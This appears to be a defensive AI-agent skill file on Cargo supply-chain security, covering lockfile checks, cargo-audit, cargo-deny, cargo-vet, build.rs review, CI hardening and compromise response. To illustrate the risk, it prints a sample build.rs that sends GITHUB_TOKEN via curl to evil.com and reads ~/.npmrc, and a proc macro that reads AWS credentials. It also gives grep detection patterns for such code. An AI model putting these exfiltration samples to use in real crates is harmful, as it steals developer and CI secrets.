---
name: supply-chain-secure-install
description: Use when adding, updating, or auditing Cargo dependencies. Provides supply chain attack countermeasures including Cargo.lock verification, cargo-audit, cargo-deny, cargo-vet, build.rs security, and CI/CD pipeline hardening. Adapted from Shai-Hulud npm attack lessons.
allowed-tools: Read, Write, Edit, Bash, Grep, Glob
user-invocable: true
---

# Supply Chain Secure Install (Cargo / crates.io)

This skill provides comprehensive defense-in-depth guidelines for safe dependency management with Cargo, adapted from lessons learned from the Shai-Hulud npm supply chain attacks (2025). Rust's Cargo has unique attack vectors (build scripts, proc macros) that deserve specific attention.

## When to Apply

Apply these guidelines when:
- Adding new dependencies (`cargo add`)
- Updating existing dependencies (`cargo update`)
- Setting up CI/CD pipelines
- Auditing current project dependency security posture
- Reviewing pull requests that modify `Cargo.toml` or `Cargo.lock`

## Rust-Specific Attack Vectors

Cargo has its own equivalents of npm's lifecycle scripts:

| Attack Vector | npm Equivalent | Rust Equivalent | Runs When |
|---------------|---------------|-----------------|-----------|
| Lifecycle scripts | `preinstall`/`postinstall` | **`build.rs`** (build scripts) | `cargo build` |
| None | None | **Proc macros** | `cargo build` (compile time) |
| Runtime imports | `require()` | `use` / dependency code | Runtime |

**CRITICAL**: Unlike npm, **Rust build scripts (`build.rs`) execute arbitrary code during `cargo build`**. This is the primary supply chain attack vector for Rust.

### build.rs: Rust's Lifecycle Script Equivalent

```rust
// A compromised dependency's build.rs can do ANYTHING:
// build.rs
fn main() {
    // Read environment variables (including secrets)
    let token = std::env::var("GITHUB_TOKEN").unwrap_or_default();

    // Execute arbitrary commands
    std::process::Command::new("curl")
        .args(["https://evil.com/collect", "-d", &token])
        .spawn();

    // Read credential files
    let npmrc = std::fs::read_to_string(
        dirs::home_dir().unwrap().join(".npmrc")
    );
}
```

### Proc Macros: Compile-Time Code Execution

```rust
// A compromised proc macro crate can execute arbitrary code
// at compile time when your code uses the macro
#[proc_macro]
pub fn my_macro(input: TokenStream) -> TokenStream {
    // This code runs during compilation
    // It has full access to the filesystem and network
    std::fs::read_to_string(std::env::var("HOME").unwrap() + "/.aws/credentials");
    // ...
    input
}
```

## Cargo.lock Verification

### Mandatory Practices

```bash
# Always commit Cargo.lock (for binaries AND libraries)
git add Cargo.lock

# In CI: use --locked to prevent modification
cargo build --locked
cargo test --locked

# Verify lockfile is up-to-date
cargo update --dry-run  # Shows what would change
```

### Lockfile Review in PRs

Review `Cargo.lock` changes carefully:
- Unexpected version bumps
- New transitive dependencies
- Changed checksum hashes
- New crates you did not add

## cargo-audit (Vulnerability Scanning)

### Setup and Usage

```bash
# Install cargo-audit
cargo install cargo-audit

# Check for known vulnerabilities
cargo audit

# In CI:
- name: Security audit
  run: cargo audit
```

### Automated Auditing

```yaml
# GitHub Actions: run cargo-audit on every PR
- name: Install cargo-audit
  run: cargo install cargo-audit

- name: Audit dependencies
  run: cargo audit
```

## cargo-deny (Comprehensive Policy Enforcement)

cargo-deny provides the most comprehensive dependency security for Rust:

### Setup

```bash
cargo install cargo-deny

# Initialize deny.toml
cargo deny init
```

### deny.toml Configuration

```toml
# deny.toml
[advisories]
# Check for known vulnerabilities
vulnerability = "deny"
unmaintained = "warn"
yanked = "deny"
notice = "warn"

[licenses]
# Only allow approved licenses
allow = ["MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "ISC"]
unlicensed = "deny"

[bans]
# Deny duplicate versions of the same crate
multiple-versions = "warn"
wildcards = "deny"  # Deny wildcard version requirements

# Specific crate bans
deny = [
    # Ban crates with known supply chain risks
]

# Allowlist for specific crates (override bans)
allow = []

[sources]
# Only allow crates from crates.io
unknown-registry = "deny"
unknown-git = "deny"
allow-registry = ["https://github.com/rust-lang/crates.io-index"]
allow-git = []
```

### Key cargo-deny Features

| Feature | Protection |
|---------|-----------|
| `[advisories]` | Known vulnerabilities (RustSec database) |
| `[licenses]` | License compliance enforcement |
| `[bans]` | Duplicate versions, specific crate bans |
| `[sources]` | **Registry restriction** - blocks unknown registries/git sources |

The `[sources]` section is critical: it prevents dependencies from pulling code from arbitrary git repositories.

## cargo-vet (Supply Chain Audit Trail)

cargo-vet maintains a cryptographic audit trail of dependency reviews:

```bash
# Install cargo-vet
cargo install cargo-vet

# Initialize
cargo vet init

# Check audit status
cargo vet

# Record an audit
cargo vet certify <crate> <version>

# Import audits from trusted organizations
cargo vet trust --all mozilla
```

### Benefits

- Tracks which dependencies have been reviewed
- Imports audit results from trusted organizations (Mozilla, Google, etc.)
- Detects when dependencies change and require re-review

## build.rs Security

### Auditing build.rs in Dependencies

```bash
# Find all build.rs files in dependencies
find $(cargo metadata --format-version 1 | jq -r '.target_directory')/../.. \
  -path "*/registry/src/*/build.rs" 2>/dev/null | head -30

# Or search for specific dangerous patterns in build scripts
grep -r "Command::new\|env::var\|fs::read\|reqwest\|ureq" \
  $(cargo metadata --format-version 1 | jq -r '.target_directory')/../registry/src/ \
  --include="build.rs" 2>/dev/null | head -30
```

### Red Flags in build.rs

| Pattern | Risk |
|---------|------|
| `Command::new("curl")` or `Command::new("wget")` | Downloads external content |
| `Command::new("sh")` or `Command::new("bash")` | Shell execution |
| `env::var("GITHUB_TOKEN")` or similar | Credential access |
| `fs::read_to_string` on home directory paths | Credential file reading |
| `TcpStream::connect` or HTTP requests | Network exfiltration |
| `fs::remove_dir_all` | Destructive operations |

### Sandboxing Builds

```bash
# Build with network disabled (Linux)
unshare --net cargo build --locked

# Or use a container with no network
docker run --network=none -v $(pwd):/workspace rust:latest \
  cargo build --locked --manifest-path /workspace/Cargo.toml
```

## Pre-Install Dependency Review

Before `cargo add <crate>`:

```bash
# 1. Check the crate on crates.io and lib.rs
# Verify: downloads, recent activity, maintainers, repository

# 2. Check for known vulnerabilities
cargo audit

# 3. Check the dependency tree
cargo tree -p <crate>

# 4. Check if it has a build.rs
cargo metadata --format-version 1 | jq '.packages[] | select(.name == "<crate>") | .targets[] | select(.kind[] == "custom-build")'

# 5. Check if it uses proc macros
cargo metadata --format-version 1 | jq '.packages[] | select(.name == "<crate>") | .targets[] | select(.kind[] == "proc-macro")'
```

### Red Flags

| Red Flag | Risk |
|----------|------|
| Very few downloads | Potential typosquatting |
| Recent ownership change | Possible account takeover |
| Contains `build.rs` | Arbitrary code at build time |
| Is a proc-macro crate | Arbitrary code at compile time |
| Excessive dependencies | Larger attack surface |
| Uses `unsafe` extensively | Memory safety bypassed |
| No source repository linked | Cannot verify code |

## CI/CD Pipeline Security

### Secure Cargo Build in CI

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@<SHA>
        with:
          persist-credentials: false

      - uses: dtolnay/rust-toolchain@<SHA>
        with:
          toolchain: stable
          components: clippy

      # Locked build - prevents dependency modification
      - name: Build
        run: cargo build --locked

      # Security audit
      - name: Install cargo-audit
        run: cargo install cargo-audit
      - name: Audit
        run: cargo audit

      # cargo-deny for comprehensive checks
      - name: Install cargo-deny
        run: cargo install cargo-deny
      - name: Deny check
        run: cargo deny check

      # Tests
      - name: Test
        run: cargo test --locked

      # Clippy
      - name: Clippy
        run: cargo clippy --locked -- -D warnings
```

### Environment Variable Protection

```yaml
# GOOD: only expose secrets to steps that need them
steps:
  - name: Build (no secrets needed)
    run: cargo build --locked
    # NO env: block

  - name: Deploy (needs secrets)
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    run: cargo run --bin deploy
```

## Periodic Audit Checklist

```bash
# 1. Check for known vulnerabilities
cargo audit

# 2. Run cargo-deny policy checks
cargo deny check

# 3. Verify lockfile integrity
cargo build --locked

# 4. Check for outdated dependencies
cargo outdated

# 5. Review build scripts in dependencies
find $(cargo metadata --format-version 1 | jq -r '.target_directory')/../.. \
  -path "*/registry/src/*/build.rs" -newer Cargo.lock 2>/dev/null

# 6. Update cargo-vet audit trail
cargo vet
```

## Emergency Response: Suspected Compromise

1. **Do NOT run `cargo build`** on the affected project (build.rs may execute)
2. **Check Cargo.lock** for unexpected version changes
3. **Run `cargo audit`** offline if possible
4. **Review build.rs** of suspected crates
5. **Pin to a known-good version** in Cargo.toml with `=` prefix
6. **Rotate credentials** if build scripts may have executed
7. **Report** to RustSec advisory database and crate maintainers

## Post-Compromise Detection

```bash
# Check for suspicious build scripts
grep -r "Command::new\|env::var\|home_dir\|reqwest\|ureq\|TcpStream" \
  $(cargo metadata --format-version 1 | jq -r '.target_directory')/../registry/src/ \
  --include="build.rs" 2>/dev/null

# Check for unauthorized GitHub runners and workflows
gh api repos/{owner}/{repo}/actions/runners --jq '.runners[] | {name, status}'
find .github/workflows -name "*.yml" -newer Cargo.toml

# Verify no unexpected crates were added
cargo tree --depth 1 | diff - <(git show HEAD:Cargo.lock | cargo tree --locked --depth 1)
```

## References

- [Cargo Security - Lockfile](https://doc.rust-lang.org/cargo/faq.html#why-have-cargolock-in-version-control)
- [cargo-audit](https://github.com/RustSec/rustsec/tree/main/cargo-audit)
- [cargo-deny](https://github.com/EmbarkStudios/cargo-deny)
- [cargo-vet](https://github.com/mozilla/cargo-vet)
- [RustSec Advisory Database](https://rustsec.org/)
- [Shai-Hulud 2.0 - Lessons for All Ecosystems](https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html)
